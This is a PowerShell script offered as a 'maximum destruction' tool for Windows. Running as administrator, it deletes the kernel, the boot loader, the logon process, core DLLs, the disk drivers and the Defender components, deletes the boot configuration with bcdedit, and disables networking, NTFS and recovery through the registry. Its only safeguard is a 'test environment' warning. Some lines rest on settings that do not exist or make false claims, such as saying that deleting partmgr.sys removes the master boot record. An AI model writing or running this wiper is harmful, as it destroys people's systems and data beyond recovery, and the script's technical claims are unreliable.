# Final Stage: Maximum Destruction Script - BEYOND EXTREME
# This script will obliterate your system beyond recovery. Use only in a test environment. 
# YOU HAVE BEEN WARNED!

# Ensure script is run as Administrator
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "You need to run this script as an administrator!" -ForegroundColor Red
    exit
}

Write-Host "Starting extreme destruction of the Windows system..." -ForegroundColor Red

# PART 1: Complete Shell and GUI Removal

Write-Host "Removing Windows GUI (Shell, Taskbar, Explorer) and graphical components..." -ForegroundColor Red
# Set shell to an invalid executable to prevent any GUI from loading
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "nonexistent.exe" -Force

# Delete essential graphical components
Remove-Item -Path "C:\Windows\explorer.exe" -Force
Remove-Item -Path "C:\Windows\System32\dwm.exe" -Force
Remove-Item -Path "C:\Windows\System32\userinit.exe" -Force
Remove-Item -Path "C:\Windows\System32\Taskmgr.exe" -Force  # Disable Task Manager completely

Write-Host "Removing System Tray and Taskbar functionality..." -ForegroundColor Red
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoTrayItemsDisplay" -Value 1 -Force
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoTaskGrouping" -Value 1 -Force

# PART 2: Core Networking and Kernel-Level Destruction

Write-Host "Destroying core networking and TCP/IP stack..." -ForegroundColor Red
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "EnableTCP" -Value 0 -Force
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" -Name "EnableNetbiosOverTcpip" -Value 0 -Force

Write-Host "Deleting network drivers (tcpip.sys, ndis.sys)..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\drivers\tcpip.sys" -Force
Remove-Item -Path "C:\Windows\System32\drivers\ndis.sys" -Force
Remove-Item -Path "C:\Windows\System32\drivers\NetBT.sys" -Force  # Delete NetBIOS support

Write-Host "Disabling DHCP, DNS, and NetBIOS services completely..." -ForegroundColor Red
Set-Service -Name Dhcp -StartupType Disabled
Set-Service -Name Dnscache -StartupType Disabled
Set-Service -Name NetBT -StartupType Disabled
Stop-Service -Name Dhcp, Dnscache, NetBT -Force

# PART 3: Complete Kernel Destruction and Recovery Blocking

Write-Host "Disabling Kernel Patch Protection, CPU scheduling, and recovery options..." -ForegroundColor Red
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "DisableKernelPatchProtection" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Scheduler" -Name "Start" -Value 4 -Force  # Disable CPU Scheduler

Write-Host "Deleting Kernel Components (ntoskrnl.exe, winload.exe)..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\ntoskrnl.exe" -Force  # Main Kernel
Remove-Item -Path "C:\Windows\System32\winload.exe" -Force  # Boot loader

Write-Host "Deleting BOOTMGR to prevent recovery..." -ForegroundColor Red
Remove-Item -Path "C:\bootmgr" -Force  # Boot Manager

Write-Host "Deleting Winlogon.exe (Logon process)..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\winlogon.exe" -Force  # Logon process deletion will block login

# PART 4: Destruction of File System and Boot Config

Write-Host "Disabling NTFS file system and boot configuration..." -ForegroundColor Red
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Ntfs" -Name "Start" -Value 4 -Force  # Disable NTFS

Write-Host "Deleting Volume Snapshot and paging files..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\drivers\volsnap.sys" -Force  # Volume shadow copy deletion
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Value "" -Force  # Disable paging file

# PART 5: Power Management and System Integrity Destruction

Write-Host "Disabling ACPI (Power management) and Secure Boot..." -ForegroundColor Red
Set-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Services\ACPI" -Name "Start" -Value 4 -Force  # Disable ACPI
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\State" -Name "UEFISecureBootEnabled" -Value 0 -Force  # Disable Secure Boot

# PART 6: Disabling All System Recovery Options

Write-Host "Disabling Safe Mode and all recovery options..." -ForegroundColor Red
bcdedit /delete {default} /f  # Delete the default boot entry
bcdedit /set {bootmgr} recoveryenabled No  # Disable Windows Recovery Environment (WinRE)

Write-Host "Deleting boot configuration data (BCD) store..." -ForegroundColor Red
bcdedit /delete {bootmgr} /f  # Deletes the boot manager completely

# PART 7: Final Destruction - Removing Core Libraries and Security Features

Write-Host "Deleting Critical DLLs and Libraries (kernel32.dll, advapi32.dll)..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\kernel32.dll" -Force  # Main system library
Remove-Item -Path "C:\Windows\System32\advapi32.dll" -Force  # Advanced API library (security and registry management)

Write-Host "Removing Windows Defender and Firewall components..." -ForegroundColor Red
Set-Service -Name MpsSvc -StartupType Disabled  # Disable Windows Firewall
Stop-Service -Name MpsSvc -Force
Remove-Item -Path "C:\Windows\System32\mpssvc.dll" -Force  # Delete Firewall service

Write-Host "Removing Windows Defender and associated services..." -ForegroundColor Red
Set-Service -Name WinDefend -StartupType Disabled
Stop-Service -Name WinDefend -Force
Remove-Item -Path "C:\Windows\System32\drivers\wd.sys" -Force  # Remove Defender driver

# PART 8: Crippling Disk I/O and Boot Process

Write-Host "Disabling Disk I/O (IDE, SATA, and NVMe drivers)..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\drivers\disk.sys" -Force  # Main disk driver
Remove-Item -Path "C:\Windows\System32\drivers\storport.sys" -Force  # Storage controller
Remove-Item -Path "C:\Windows\System32\drivers\iaStorA.sys" -Force  # Intel SATA controller
Remove-Item -Path "C:\Windows\System32\drivers\nvme.sys" -Force  # NVMe driver

Write-Host "Deleting Master Boot Record (MBR) and partition table..." -ForegroundColor Red
Remove-Item -Path "C:\Windows\System32\drivers\partmgr.sys" -Force  # Delete partition manager

Write-Host "Extreme destruction complete. The system is now beyond recovery." -ForegroundColor Red
